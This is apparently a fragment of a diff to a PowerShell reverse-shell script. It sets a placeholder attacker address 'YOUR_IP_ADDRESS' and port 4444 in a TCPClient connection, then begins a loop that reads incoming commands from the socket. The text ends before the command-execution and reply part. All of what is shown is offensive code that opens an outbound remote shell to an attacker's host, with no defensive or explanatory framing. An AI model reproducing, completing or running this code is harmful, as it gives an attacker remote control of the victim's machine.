@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP_ADDRESS", YOUR_PORT_NUMBER);
+$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP_ADDRESS", 4444);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
